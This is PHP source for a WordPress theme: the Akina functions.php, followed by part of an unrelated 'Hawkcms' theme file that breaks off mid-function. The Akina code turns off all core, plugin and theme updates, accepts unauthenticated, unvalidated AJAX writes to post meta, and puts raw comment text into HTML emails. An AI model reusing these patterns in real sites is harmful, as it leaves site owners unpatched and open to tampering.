<?php
/**
 * Akina functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Akina
 */

//获取当前主题版本
$theme = wp_get_theme();
$theme_version = $theme->get('Version');
define('SIREN_VERSION', $theme_version);

if (!function_exists('akina_setup')) :
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */

    if (!function_exists('optionsframework_init')) {
        define('OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/inc/');
        require_once dirname(__FILE__) . '/inc/options-framework.php';
    }

    function akina_setup()
    {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Akina, use a find and replace
         * to change 'akina' to the name of your theme in all the template files.
         */
        // load_theme_textdomain('akina', get_template_directory() . '/languages');
        // load_theme_textdomain('options_framework_theme', get_template_directory() . '/languages');

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support('post-thumbnails');
        set_post_thumbnail_size(150, 150, true);

        // This theme uses wp_nav_menu() in one location.
        register_nav_menus(array(
            'primary' => esc_html__('导航菜单', 'akina'),
        ));

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
        ));

        /*
         * Enable support for Post Formats.
         * See https://developer.wordpress.org/themes/functionality/post-formats/
         */
        add_theme_support('post-formats', array(
            'aside',
            'image',
            'status',
        ));

        // Set up the WordPress core custom background feature.
        add_theme_support('custom-background', apply_filters('akina_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => '',
        )));

        add_filter('pre_option_link_manager_enabled', '__return_true');

        remove_action('wp_head', 'wp_shortlink_wp_head');    //移除文章短链接
        remove_action('wp_head', 'feed_links', 2);
        remove_action('wp_head', 'feed_links_extra', 3);
        remove_action('wp_head', 'rsd_link');
        remove_action('wp_head', 'wlwmanifest_link');
        remove_action('wp_head', 'index_rel_link');
        remove_action('wp_head', 'start_post_rel_link', 10, 0);
        remove_action('wp_head', 'rest_output_link_wp_head', 10);
        remove_action('wp_head', 'wp_generator');    //隐藏WordPress版本
        remove_filter('the_content', 'wptexturize');    //取消标点符号转义
        remove_action('rest_api_init', 'wp_oembed_register_route');
        remove_filter('rest_pre_serve_request', '_oembed_rest_pre_serve_request', 10, 4);
        remove_filter('oembed_dataparse', 'wp_filter_oembed_result', 10);
        remove_filter('oembed_response_data', 'get_oembed_response_data_rich', 10, 4);
        remove_action('wp_head', 'wp_oembed_add_discovery_links');
        remove_action('wp_head', 'wp_oembed_add_host_js');
        remove_action('template_redirect', 'rest_output_link_header', 11, 0);

        add_filter('automatic_updater_disabled', '__return_true');    //彻底关闭自动更新

        remove_action('init', 'wp_schedule_update_checks');    //关闭更新检查定时计划

        wp_clear_scheduled_hook('wp_version_check');    //移除版本检查定时计划
        wp_clear_scheduled_hook('wp_update_plugins');    //移除插件更新定时计划
        wp_clear_scheduled_hook('wp_update_themes');    //移除主题更新定时计划
        wp_clear_scheduled_hook('wp_maybe_auto_update');    //移除自动更新定时计划

        remove_action('admin_init', '_maybe_update_core');    //移除后台内核更新检查
        remove_action('load-plugins.php', 'wp_update_plugins');    //移除后台插件更新检查
        remove_action('load-update.php', 'wp_update_plugins');
        remove_action('load-update-core.php', 'wp_update_plugins');
        remove_action('admin_init', '_maybe_update_plugins');

        remove_action('load-themes.php', 'wp_update_themes');    //移除后台主题更新检查
        remove_action('load-update.php', 'wp_update_themes');
        remove_action('load-update-core.php', 'wp_update_themes');
        remove_action('admin_init', '_maybe_update_themes');

        add_action('wp_print_scripts', 'fanly_no_autosave');    //禁用文章自动保存
        function fanly_no_autosave()
        {
            wp_deregister_script('autosave');
        }

        add_filter('wp_revisions_to_keep', 'fanly_wp_revisions_to_keep', 10, 2);    //禁用文章修订版本
        function fanly_wp_revisions_to_keep($num, $post)
        {
            return 0;
        }

        function coolwp_remove_open_sans_from_wp_core()
        {
            wp_deregister_style('open-sans');
            wp_register_style('open-sans', false);
            wp_enqueue_style('open-sans', '');
        }

        add_action('init', 'coolwp_remove_open_sans_from_wp_core');

        add_filter('contextual_help', 'wpse50723_remove_help', 999, 3);

        function wpse50723_remove_help($old_help, $screen_id, $screen)
        {
            $screen->remove_help_tabs();
            return $old_help;
        }

        /**
         * 禁用原生 EMOJI
         */
        function disable_emojis()
        {
            remove_action('wp_head', 'print_emoji_detection_script', 7);
            remove_action('admin_print_scripts', 'print_emoji_detection_script');
            remove_action('wp_print_styles', 'print_emoji_styles');
            remove_action('admin_print_styles', 'print_emoji_styles');
            remove_filter('the_content_feed', 'wp_staticize_emoji');
            remove_filter('comment_text_rss', 'wp_staticize_emoji');
            remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
            add_filter('tiny_mce_plugins', 'disable_emojis_tinymce');
        }

        add_action('init', 'disable_emojis');

        /**
         * 禁用编辑器 EMOJI
         */
        function disable_emojis_tinymce($plugins)
        {
            if (is_array($plugins)) {
                return array_diff($plugins, array('wpemoji'));
            } else {
                return array();
            }
        }

        /**
         * 移除菜单冗余代码
         */
        add_filter('nav_menu_css_class', 'my_css_attributes_filter', 100, 1);
        add_filter('nav_menu_item_id', 'my_css_attributes_filter', 100, 1);
        add_filter('page_css_class', 'my_css_attributes_filter', 100, 1);
        function my_css_attributes_filter($var)
        {
            return is_array($var) ? array_intersect($var, array('current-menu-item', 'current-post-ancestor', 'current-menu-ancestor', 'current-menu-parent')) : '';
        }

        /**
         * 移除前端 DNS 预获取
         */
        function remove_dns_prefetch($hints, $relation_type)
        {
            if ('dns-prefetch' === $relation_type) {
                return array_diff(wp_dependencies_unique_hosts(), $hints);
            }

            return $hints;
        }

        add_filter('wp_resource_hints', 'remove_dns_prefetch', 10, 2);

        /**
         * 移除古腾堡编辑器前端样式
         * 适用于 WordPress 5.0+
         */
        add_action('wp_enqueue_scripts', 'remove_block_library_css', 100);
        function remove_block_library_css()
        {
            wp_dequeue_style('wp-block-library');
        }
    }
endif;
add_action('after_setup_theme', 'akina_setup');

/**
 * 定义管理后台字体
 */
function admin_font()
{ ?>
    <style type="text/css">
        body {
            font-family: "Microsoft JhengHei", miranafont, "Hiragino Sans GB", STXihei, "Microsoft YaHei", SimSun, Sans-Serif;
            font-weight: bold;
        }
    </style>
<?php }

add_action('admin_head', 'admin_font');

/**
 * 添加高斯模糊配色
 */
wp_admin_css_color('blur', __('高斯'), get_template_directory_uri() . '/inc/css/blur-colors.css', array('#00000080', '#ffffff87', '#ffffff87', '#ffffff87'));

if (get_user_option('admin_color') == "blur") {
    function blur_image()
    {
        if (akina_option('blur_bg')) {
            $blurbg = akina_option('blur_bg');
        } else {
            $blurbg = get_random_bg_url();
        } ?>
        <style type="text/css">
            body::before {
                background-image: url('<?php echo $blurbg; ?>');
            }
        </style>
    <?php }
    add_action('admin_head', 'blur_image');

    if (akina_option('blur_custom_style')) {
        function blur_custom()
        { ?>
            <style type="text/css">
                <?php echo akina_option('blur_custom_style'); ?>
            </style>
        <?php }
        add_action('admin_head', 'blur_custom');
    }

    if (akina_option('mobile_blur') == '0') {
        function blur_mobile()
        { ?>
            <style type="text/css">
                @media (max-width: 860px) {
                    body {
                        background: #f1f1f1;
                    }

                    body::before {
                        background-image: none !important;
                    }
                }
            </style>
        <?php }
        add_action('admin_head', 'blur_mobile');
    }
}

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function akina_content_width()
{
    $GLOBALS['content_width'] = apply_filters('akina_content_width', 640);
}

add_action('after_setup_theme', 'akina_content_width', 0);

/**
 * Enqueue Scripts And Styles
 */
function akina_scripts()
{
    wp_enqueue_style('siren', get_stylesheet_uri(), array(), SIREN_VERSION);
    wp_enqueue_script('jq', 'https://cdn.jsdelivr.net/npm/jquery@2.2.4/dist/jquery.min.js', array(), SIREN_VERSION, true);
    wp_enqueue_script('pjax-libs', get_template_directory_uri() . '/js/jquery.pjax.js', array(), SIREN_VERSION, true);
    wp_enqueue_script('input', get_template_directory_uri() . '/js/input.min.js', array(), SIREN_VERSION, true);
    wp_enqueue_script('app', get_template_directory_uri() . '/js/app.js', array(), SIREN_VERSION, true);
    $mv_live = akina_option('focus_mvlive') ? 'open' : 'close';
    $movies = akina_option('focus_amv') ? array('url' => akina_option('amv_url'), 'name' => akina_option('amv_title'), 'live' => $mv_live) : 'close';
    $auto_height = akina_option('focus_height') ? 'fixed' : 'auto';
    $live2d_tips = akina_option('live2d_s') ? 'open' : 'close';
    $hitokoto = akina_option('hitokoto_o') ? 'open' : 'close';
    $laziness_img = akina_option('laziness_img') ? 'open' : 'close';
    if (wp_is_mobile()) $auto_height = 'fixed';    //拦截移动端
    global $theme_version;
    wp_localize_script('app', 'Poi', array(
        'pjax' => akina_option('poi_pjax'),
        'code_pjax' => akina_option('code_pjax'),
        'movies' => $movies,
        'windowheight' => $auto_height,
        'live2d_tips' => $live2d_tips,
        'hitokoto' => $hitokoto,
        'laziness_img' => $laziness_img,
        'theme_version' => $theme_version,
        'web_title' => akina_option('web_title'),
        'picture_m' => akina_option('picture_m'),
        'ajaxurl' => admin_url('admin-ajax.php'),
        'order' => get_option('comment_order'),    //ajax comments
        'formpostion' => 'bottom'    //ajax comments
    ));
}

add_action('wp_enqueue_scripts', 'akina_scripts');

/**
 * Load Other Functions
 */
require get_template_directory() . '/inc/decorate.php';
require get_template_directory() . '/inc/random.php';
require get_template_directory() . '/inc/useragent.php';

/**
 * Custom Template Tags
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer Additions
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Function Update
 */
require get_template_directory() . '/inc/siren-update.php';
require get_template_directory() . '/inc/categories-images.php';

/**
 * Disable Embeds
 */
require get_template_directory() . '/inc/disable-embeds.php';

/**
 * 心情说说
 */
if (akina_option('shuoshuo') == 'yes') {
    require get_template_directory() . '/inc/shuoshuo.php';
}

/**
 * 评论模板
 */
if (!function_exists('akina_comment_format')) {
    function akina_comment_format($comment, $args, $depth)
    {
        $GLOBALS['comment'] = $comment;
        ?>
        <li <?php comment_class(); ?> id="comment-<?php echo esc_attr(comment_ID()); ?>">
        <div class="contents">
            <div class="comment-arrow">
                <div class="main shadow">
                    <div class="profile">
                        <a href="<?php comment_author_url(); ?>"><?php echo get_avatar($comment->comment_author_email, '80', '', get_comment_author()); ?></a>
                    </div>
                    <div class="commentinfo">
                        <section class="commeta">
                            <div class="left">
                                <h4 class="author">
                                    <a href="<?php comment_author_url(); ?>" target="_blank" rel="nofollow"><?php echo get_avatar($comment->comment_author_email, '24', '', get_comment_author()); ?><?php comment_author(); ?>
                                        <span class="isauthor" title="<?php esc_attr_e('Author', 'akina'); ?>">博主</span>
                                    </a>
                                </h4>
                            </div>
                            <?php comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
                            <?php if (current_user_can('level_10')) {
                                $admin_url = admin_url();
                                echo '
                                <span class="deleteComments" onclick="deleteComments(this);" data-url="' . wp_nonce_url($admin_url . 'comment.php?c=' . $comment->comment_ID . '&amp;action=deletecomment', 'delete-comment_' . $comment->comment_ID) . '">删除</span>
                                ';
                            } ?>
                            <div class="right">
                                <div class="info">
                                    <time datetime="<?php comment_date('Y-m-d'); ?>"><?php echo poi_time_since(strtotime($comment->comment_date_gmt), true); ?></time>
                                    <?php echo siren_get_useragent($comment->comment_agent); ?>
                                </div>
                            </div>
                        </section>
                    </div>
                    <div class="body">
                        <?php comment_text(); ?>
                    </div>
                </div>
                <div class="arrow-left"></div>
            </div>
        </div>
        <hr>
        <?php
    }
}

/**
 * Post Views
 */
function restyle_text($number)
{
    if ($number >= 1000) {
        return round($number / 1000, 2) . 'k';
    } else {
        return $number;
    }
}

function set_post_views()
{
    global $post;
    $post_id = intval($post->ID);
    $count_key = 'views';
    $views = get_post_custom($post_id);
    $views = intval($views['views'][0]);
    if (is_single() || is_page()) {
        if (!update_post_meta($post_id, 'views', ($views + 1))) {
            add_post_meta($post_id, 'views', 1, true);
        }
    }
}

add_action('get_header', 'set_post_views');

function get_post_views($post_id)
{
    $count_key = 'views';
    $views = get_post_custom($post_id);
    $views = intval($views['views'][0]);
    $post_views = intval(post_custom('views'));
    if ($views == '') {
        return 0;
    } else {
        return restyle_text($views);
    }
}

/**
 * AJAX点赞
 */
add_action('wp_ajax_nopriv_specs_zan', 'specs_zan');
add_action('wp_ajax_specs_zan', 'specs_zan');
function specs_zan()
{
    global $wpdb, $post;
    $id = $_POST["um_id"];
    $action = $_POST["um_action"];
    if ($action == 'ding') {
        $specs_raters = get_post_meta($id, 'specs_zan', true);
        $expire = time() + 99999999;
        $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;    //make cookies work with localhost
        setcookie('specs_zan_' . $id, $id, $expire, '/', $domain, false);
        if (!$specs_raters || !is_numeric($specs_raters)) {
            update_post_meta($id, 'specs_zan', 1);
        } else {
            update_post_meta($id, 'specs_zan', ($specs_raters + 1));
        }
        echo get_post_meta($id, 'specs_zan', true);
    }
    die;
}

/**
 * GRAVATAR头像使用中国服务器
 */
function gravatar_cn($url)
{
    $gravatar_url = array('0.gravatar.com/', '1.gravatar.com/', '2.gravatar.com/', 's.gravatar.com/', 'secure.gravatar.com/');
    return str_replace($gravatar_url, 'cdn.v2ex.com/gr', $url);
}

add_filter('get_avatar_url', 'gravatar_cn', 4);

/**
 * 阻止站内文章互相 PINGBACK
 */
function theme_noself_ping(&$links)
{
    $home = get_option('home');
    foreach ($links as $l => $link)
        if (0 === strpos($link, $home))
            unset($links[$l]);
}

add_action('pre_ping', 'theme_noself_ping');

/**
 * 订制 BODY 类
 */
function akina_body_classes($classes)
{
    //Adds a class of group-blog to blogs with more than 1 published author.
    if (is_multi_author()) {
        $classes[] = 'group-blog';
    }
    //Adds a class of hfeed to non-singular pages.
    if (!is_singular()) {
        $classes[] = 'hfeed';
    }
    return $classes;
}

add_filter('body_class', 'akina_body_classes');

/**
 * 图片七牛云缓存
 */
add_filter('upload_dir', 'wpjam_custom_upload_dir');
function wpjam_custom_upload_dir($uploads)
{
    $upload_path = '';
    $upload_url_path = akina_option('qiniu_cdn');

    if (empty($upload_path) || 'wp-content/uploads' == $upload_path) {
        $uploads['basedir'] = WP_CONTENT_DIR . '/uploads';
    } elseif (0 !== strpos($upload_path, ABSPATH)) {
        $uploads['basedir'] = path_join(ABSPATH, $upload_path);
    } else {
        $uploads['basedir'] = $upload_path;
    }

    $uploads['path'] = $uploads['basedir'] . $uploads['subdir'];

    if ($upload_url_path) {
        $uploads['baseurl'] = $upload_url_path;
        $uploads['url'] = $uploads['baseurl'] . $uploads['subdir'];
    }
    return $uploads;
}

/**
 * 删除自带小工具
 */
function unregister_default_widgets()
{
    unregister_widget("WP_Widget_Pages");
    unregister_widget("WP_Widget_Calendar");
    unregister_widget("WP_Widget_Archives");
    unregister_widget("WP_Widget_Links");
    unregister_widget("WP_Widget_Meta");
    unregister_widget("WP_Widget_Search");
    unregister_widget("WP_Widget_Text");
    unregister_widget("WP_Widget_Categories");
    unregister_widget("WP_Widget_Recent_Posts");
    unregister_widget("WP_Widget_Recent_Comments");
    unregister_widget("WP_Widget_RSS");
    unregister_widget("WP_Widget_Tag_Cloud");
    unregister_widget("WP_Nav_Menu_Widget");
}

add_action("widgets_init", "unregister_default_widgets", 11);

/**
 * Jetpack setup function.
 *
 * See: https://jetpack.com/support/infinite-scroll/
 * See: https://jetpack.com/support/responsive-videos/
 */
function akina_jetpack_setup()
{
    //Add theme support for Infinite Scroll.
    add_theme_support('infinite-scroll', array(
        'container' => 'main',
        'render' => 'akina_infinite_scroll_render',
        'footer' => 'page',
    ));

    //Add theme support for Responsive Videos.
    add_theme_support('jetpack-responsive-videos');
}

add_action('after_setup_theme', 'akina_jetpack_setup');

/**
 * Custom render function for Infinite Scroll.
 */
function akina_infinite_scroll_render()
{
    while (have_posts()) {
        the_post();
        if (is_search()) :
            get_template_part('tpl/content', 'search');
        else :
            get_template_part('tpl/content', get_post_format());
        endif;
    }
}

/**
 * 编辑器下载按钮
 */
function download($atts, $content = null)
{
    return '<a class="download" href="' . $content . '" rel="external" target="_blank" title="下载地址"><span><i class="iconfont down">&#xe69f;</i>Download</span></a>' ;
}

add_shortcode("download", "download");

function bolo_after_wp_tiny_mce($mce_settings)
{ ?>
    <script type="text/javascript">
        QTags.addButton('download', '下载按钮', "[download] 把文件地址填写在这里 [/download]");
    </script>
<?php }

add_action('after_wp_tiny_mce', 'bolo_after_wp_tiny_mce');

/**
 * 后台登录页美化
 */
function custom_login()
{
    if (akina_option('login_bg')) {
        $loginbg = akina_option('login_bg');
    } else {
        $loginbg = get_random_bg_url();
    } ?>
    <link rel="stylesheet" type="text/css" href="<?php echo get_bloginfo('template_directory'); ?>/inc/css/login.css">
    <style type="text/css">
        body::before {
            background-image: url('<?php echo $loginbg; ?>');
        }
    </style>
<?php }

add_action('login_head', 'custom_login');

function custom_headertitle($title)
{
    return get_bloginfo('name');
}

add_filter('login_headertitle', 'custom_headertitle');

function custom_loginlogo_url($url)
{
    return esc_url(home_url('/'));
}

add_filter('login_headerurl', 'custom_loginlogo_url');

/**
 * 评论回复邮件模板
 */
function comment_mail_notify($comment_id)
{
    $mail_user_name = akina_option('mail_user_name') ? akina_option('mail_user_name') : 'Poi';
    $comment = get_comment($comment_id);
    $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
    $spam_confirmed = $comment->comment_approved;
    if (($parent_id != '') && ($spam_confirmed != 'spam')) {
        $wp_email = $mail_user_name . '@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));
        $to = trim(get_comment($parent_id)->comment_author_email);
        $subject = '你在「' . get_option("blogname") . '」的留言有了回应';
        $message = '
    <table border="1" cellpadding="0" cellspacing="0" width="600" align="center" style="border-collapse: collapse; border-style: solid; border-width: 1; border-color:#ddd;">
    <tbody>
        <tr>
            <td>
                <table align="center" border="0" cellpadding="0" cellspacing="0" width="600" height="48" >
                    <tbody>
                        <tr>
                            <td width="100" align="center" style="border-right: 1px solid #ddd;">
                                <a href="' . home_url() . '/" target="_blank">' . get_option("blogname") . '</a>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </td>
        </tr>
        <tr>
            <td style="padding: 20px 40px 0;">
                <p><strong>' . trim(get_comment($parent_id)->comment_author) . '</strong>, 你好!</p>
                <p>你在「' . get_the_title($comment->comment_post_ID) . '」的留言:</p>
                <p style="border-left: 3px solid #ddd; padding-left: 1rem; color: #999;">' . trim(get_comment($parent_id)->comment_content) . '</p>
                <p>' . trim($comment->comment_author) . ' 给你的回复:</p>
                <p style="border-left: 3px solid #ddd; padding-left: 1rem; color:#999;">' . trim($comment->comment_content) . '</p>
                <center><a href="' . htmlspecialchars(get_comment_link($parent_id)) . '" target="_blank" style="background-color: #6ec3c8; border-radius: 10px; display:inline-block; color:#fff; padding: 15px 20px 15px 20px; text-decoration: none; margin-top: 20px; margin-bottom: 20px;">点击查看完整内容</a></center>
            </td>
        </tr>
        <tr>
            <td align="center" valign="center" height="38" style="font-size: 0.8rem; color: #999;">© ' . get_option("blogname") . '</td>
        </tr>
    </tbody>
    </table>
    ';
        $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
        $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
        wp_mail($to, $subject, $message, $headers);
    }
}

add_action('comment_post', 'comment_mail_notify');

/**
 * 开放访客评论HTML标签
 */
function sig_allowed_html_tags_in_comments()
{
    define('CUSTOM_TAGS', true);
    global $allowedtags;
    $allowedtags = array(
        'a' => array(
            'href' => array()
        ),
        'img' => array(
            'class' => array(),
            'src' => array()
        ),
        'code' => array()
    );
}

add_action('init', 'sig_allowed_html_tags_in_comments', 10);

/**
 * 后台编辑器添加前台CSS
 */
function sig_add_editor_styles()
{
    add_editor_style('style.css');
}

add_action('init', 'sig_add_editor_styles');

/**
 * 净化图片多余标签结构
 */
if (akina_option('remove_attribute') == '1') {
    function remove_attribute_a($content)
    {
        $content = preg_replace('/class=\"[^\"]*\"/', "", $content);
        $content = preg_replace('/(width|height)="\d*"\s/', "", $content);
        $content = preg_replace('/  /', "", $content);
        return $content;
    }

    function remove_attribute_b($content)
    {
        $content = preg_replace('/(width|height)="\d*"\s/', "", $content);
        $content = preg_replace('/srcset=\"[^\"]*\"\s+sizes=\"[^\"]*\"/', "", $content);
        $content = preg_replace('/  /', "", $content);
        return $content;
    }

    add_filter('post_thumbnail_html', 'remove_attribute_a', 10);
    add_filter('image_send_to_editor', 'remove_attribute_a', 10);
    add_filter('the_content', 'remove_attribute_b', 10);

    function custom_caption_shortcode($attr, $content = null)
    {
        if (!isset($attr['caption'])) {
            if (preg_match('#((?:<a [^>]+>s*)?<img [^>]+>(?:s*</a>)?)(.*)#is', $content, $matches)) {
                $content = $matches[1];
                $attr['caption'] = trim($matches[2]);
            }
        }
        $output = apply_filters('img_caption_shortcode', '', $attr, $content);
        if ($output != '') return $output;
        extract(shortcode_atts(array(
            'id' => '',
            'align' => 'alignnone',
            'width' => '',
            'caption' => ''
        ), $attr, 'caption'));
        if (1 > (int)$width || empty($caption)) return $content;
        return '<figure class="wp-caption ' . esc_attr($align) . '">' . do_shortcode($content) . '<figcaption class="wp-caption-text">' . $caption . '</figcaption></figure>';
    }

    add_shortcode('caption', 'custom_caption_shortcode');
}

/**
 * 文章图片延迟加载处理
 */
if (akina_option('laziness_img') == true) {
    $preset = get_template_directory_uri() . '/images/preloader.svg';
    function lazinessImg($content)
    {
        global $preset;
        $imgsrc = '/<img(.+)src=[\'"]([^\'"]+)[\'"](.*)>/i';
        $replace = "<img class=\"lazinessImg\" src=\"$preset\" data-src=\"\$2\" \$3>";
        $content = preg_replace($imgsrc, $replace, $content);
        return $content;
    }

    add_filter('the_content', 'lazinessImg');
}

/**
 * 修改评论回复按钮链接
 */
global $wp_version;
if (version_compare($wp_version, '5.1.1', '>=')) {
    add_filter('comment_reply_link', 'haremu_replace_comment_reply_link', 10, 4);
    function haremu_replace_comment_reply_link($link, $args, $comment, $post)
    {
        if (get_option('comment_registration') && !is_user_logged_in()) {
            $link = sprintf(
                '<a rel="nofollow" class="comment-reply-login" href="%s">%s</a>',
                esc_url(wp_login_url(get_permalink())),
                $args['login_text']
            );
        } else {
            $onclick = sprintf(
                'return addComment.moveForm( "%1$s-%2$s", "%2$s", "%3$s", "%4$s" )',
                $args['add_below'],
                $comment->comment_ID,
                $args['respond_id'],
                $post->ID
            );
            $link = sprintf(
                "<a rel='nofollow' class='comment-reply-link' href='%s' onclick='%s' aria-label='%s'>%s</a>",
                esc_url(add_query_arg('replytocom', $comment->comment_ID, get_permalink($post->ID))) . "#" . $args['respond_id'],
                $onclick,
                esc_attr(sprintf($args['reply_to_text'], $comment->comment_author)),
                $args['reply_text']
            );
        }
        return $link;
    }
}
?>
<?php
$theme_name = 'Hawkcms';

add_action( 'after_setup_theme', 'init_setup_theme' );

//include('theme-option.php');

add_filter( 'pre_option_link_manager_enabled', '__return_true' );

function dopt($e){
    return stripslashes(get_option($e));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
        'name'          => '首页侧栏',
        'id'            => 'widget_homesidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name'          => '文章页侧栏',
        'id'            => 'widget_postsidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
}
function init_setup_theme(){

    //去除头部冗余代码
    remove_action( 'wp_head',   'feed_links_extra', 3 );
    remove_action( 'wp_head',   'rsd_link' );
    remove_action( 'wp_head',   'wlwmanifest_link' );
    remove_action( 'wp_head',   'index_rel_link' );
    remove_action( 'wp_head',   'start_post_rel_link', 10, 0 );
	remove_action( 'wp_head',   'wp_shortlink_wp_head', 10, 0 );
    //隐藏admin Bar
	function hide_admin_bar($flag) {
		return false;
	}
	add_filter('show_admin_bar','hide_admin_bar');

    //关键字
    add_action('wp_head','set_meta_keywords');

    //页面描述
    add_action('wp_head','set_meta_description');

    //阻止站内PingBack
    if( dopt('d_pingback_b') != '' ){
        add_action('pre_ping','noself_ping');
    }

    //Gzip压缩
    add_action('init','ux_gzip');

    //文章末尾增加版权
    add_filter('the_content','set_copyright');

    //移除自动保存和修订版本
    if( dopt('d_autosave_b') != '' ){
        add_action('wp_print_scripts','ux_disable_autosave' );
        remove_action('pre_post_update','wp_save_post_revision' );
    }

    //去除自带js
    wp_deregister_script( 'l10n' );

    //修改默认发信地址
    add_filter('wp_mail_from', 'res_from_email');
    add_filter('wp_mail_from_name', 'res_from_name');

    //缩略图设置
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(140, 98, true);

    add_editor_style('editor-style.css');

    //定义菜单
    if (function_exists('register_nav_menus')){
        register_nav_menus( array(
            'nav' => __('导航'),
            'footer' => __('底部链接'),
            'menu' => __('页面菜单')
        ) );
    }

}

// 取消原有jQuery
if ( !is_admin() ) {
    if ( $localhost == 0 ) {
        function my_init_method() {
            wp_deregister_script( 'jquery' );
        }
        add_action('init', 'my_init_method');
    }
}

$dHasShare = false;
function default_avatar_url($mail){
  $p = get_bloginfo('template_directory').'/default.png';
  if($mail=='') return $p;
  preg_match("/src='(.*?)'/i", get_avatar( $mail,'36',$p ), $matches);
  return $matches[1];
}

//评论头像缓存
function set_comment_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $w = get_bloginfo('wpurl');
  $e = ABSPATH .'avatar/'. $f .'.png';
  $t = dopt('d_avatarDate')*24*60*60;
  if ( !is_file($e) || (time() - filemtime($e)) > $t )
    copy(htmlspecialchars_decode($g), $e);
  else
    $avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.png'));
  if ( filesize($e) < 500 )
    copy(get_bloginfo('template_directory').'/img/default.png', $e);
  return $avatar;
}


//关键字
function set_meta_keywords() {
  global $s, $post;
  $keywords = '';
  if ( is_single() ) {
    if ( get_the_tags( $post->ID ) ) {
      foreach ( get_the_tags( $post->ID ) as $tag ) $keywords .= $tag->name . ', ';
    }
    foreach ( get_the_category( $post->ID ) as $category ) $keywords .= $category->cat_name . ', ';
    $keywords = substr_replace( $keywords , '' , -2);
  } elseif ( is_home () )    { $keywords = dopt('d_keywords');
  } elseif ( is_tag() )      { $keywords = single_tag_title('', false);
  } elseif ( is_category() ) { $keywords = single_cat_title('', false);
  } elseif ( is_search() )   { $keywords = esc_html( $s, 1 );
  } else { $keywords = trim( wp_title('', false) );
  }
  if ( $keywords ) {
    echo "<meta name=\"keywords\" content=\"$keywords\">\n";
  }
}

//网站描述
function set_meta_description() {
  global $s, $post;
  $description = '';
  $blog_name = get_bloginfo('name');
  if ( is_singular() ) {
    if( !empty( $post->post_excerpt ) ) {
      $text = $post->post_excerpt;
    } else {
      $text = $post->post_content;
    }
    $description = trim( str_replace( array( "\r\n", "\r", "\n", "　", " "), " ", str_replace( "\"", "'", strip_tags( $text ) ) ) );
    if ( !( $description ) ) $description = $blog_name . "-" . trim( wp_title('', false) );
  } elseif ( is_home () )    { $description = $blog_name . "-" . get_bloginfo('description') . dopt('d_description'); // 首頁要自己加
  } elseif ( is_tag() )      { $description = $blog_name . "'" . single_tag_title('', false) . "'";
  } elseif ( is_category() ) { $description = $blog_name . "'" . single_cat_title('', false) . "'";
  } elseif ( is_archive() )  { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  } elseif ( is_search() )   { $description = $blog_name . ": '" . esc_html( $s, 1 ) . "' 的搜索結果";
  } else { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  }
  $description = mb_substr( $description, 0, 220, 'utf-8' ) . '..';
  echo "<meta name=\"description\" content=\"$description\">\n";
}

//阻止站内文章Pingback
function noself_ping( &$links ) {
  $home = get_option( 'home' );
  foreach ( $links as $l => $link )
  if ( 0 === strpos( $link, $home ) )
  unset($links[$l]);
}

//移除自动保存
function ux_disable_autosave() {
  wp_deregister_script('autosave');
}

//垃圾评论拦截
class anti_spam {
  function anti_spam() {
    if ( !current_user_can('level_0') ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('init', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $spamcom = isset($_POST['comment'])        ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "$spamcom";
    }
  }

  function sink( $comment ) {
  $email = $comment['comment_author_email'];
  $g = 'http://www.gravatar.com/avatar/'. md5( strtolower( $email ) ). '?d=404';
  $headers = @get_headers( $g );
    if ( !preg_match("|200|", $headers[0]) ) {
